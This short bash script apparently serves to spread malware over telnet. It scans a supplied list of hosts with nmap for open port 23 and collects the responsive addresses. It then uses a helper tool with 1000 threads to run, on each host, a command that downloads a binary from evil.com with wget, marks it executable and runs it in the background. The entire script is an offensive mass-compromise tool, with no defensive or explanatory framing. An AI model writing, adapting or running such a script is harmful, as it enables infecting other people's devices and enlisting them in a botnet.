#!/bin/bash
list=$@
nmap -Pn -n -iL $list -p 23 --open --script=banner -oG open.bots
grepips -f open.bots |sort -u > open.ips ; rm open.bots
cmd='sh -c "cd /tmp;wget -O evil.binary http://evil.com/lol ; chmod +x evil.binary ; (./evil.binary)& >/dev/null'
./pycc -m s -l open.ips -t 1000 -c "$cmd" -T 60
rm open.ips

exit
